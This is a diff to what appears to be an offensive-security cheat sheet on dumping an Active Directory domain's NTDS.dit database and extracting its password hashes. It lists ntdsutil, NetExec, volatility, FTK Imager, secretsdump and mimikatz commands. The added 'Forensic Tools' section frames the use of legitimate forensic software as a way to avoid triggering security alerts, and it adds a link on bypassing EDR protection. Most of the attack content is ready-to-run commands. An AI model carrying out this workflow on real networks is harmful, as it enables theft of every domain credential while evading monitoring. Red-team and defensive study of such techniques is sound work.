@@ -48,15 +48,32 @@ The VSS is a Windows service that allows users to create snapshots or backups of
   ```powershell
   ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
   ```
-* [netexec VSS module](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit)
+* [Pennyw0rth/NetExec](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit) - VSS module
   ```powershell
   nxc smb 10.10.0.202 -u username -p password --ntds vss
   ```
 
 
+## Forensic Tools
+
+A good method for avoiding or reducing detections involves using common forensic tools to dump the NTDS.dit file and the SYSTEM hive. By utilizing widely recognized and legitimate forensic software, the process can be conducted more discreetly and with a lower risk of triggering security alerts.
+
+
+* Dump the memory with [magnet/dumpit](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/)
+* Use volatility to extract the `SYSTEM` hive
+  ```ps1
+  volatility -f test.raw windows.registry.printkey.PrintKey
+  volatility --profile=Win10x64_14393 dumpregistry -o 0xaf0287e41000 -D output_vol -f test.raw
+  ```
+* Use [exterro/ftk-imager](https://www.exterro.com/digital-forensics-software/ftk-imager) to read the disk in raw state 
+  * Go to `File` -> `Add Evidence Item` -> `Physical Drive` -> `Select the C drive`.
+  * Export `C:\Windows\NTDS\ntds.dit`.
+* Finally use secretdump: `secretsdump.py LOCAL -system output_vol/registry.0xaf0287e41000.SYSTEM.reg -ntds ntds.dit`
+
+
 ## Extract hashes from ntds.dit
 
-then you need to use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
+Then you need to use [impacket/secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
 
 ```java
 secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
@@ -158,3 +175,4 @@ mimikatz> lsadump::lsa /inject /name:krbtgt
 * [Diskshadow The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
 * [Dumping Domain Password Hashes - Pentestlab - July 4, 2018](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
 * [Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - 06/12/2023](https://www.synacktiv.com/publications/using-ntdissector-to-extract-secrets-from-adam-ntds-files)
+* [Bypassing EDR NTDS.dit protection using BlueTeam tools - bilal al-qurneh - Jun 9, 2024](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)
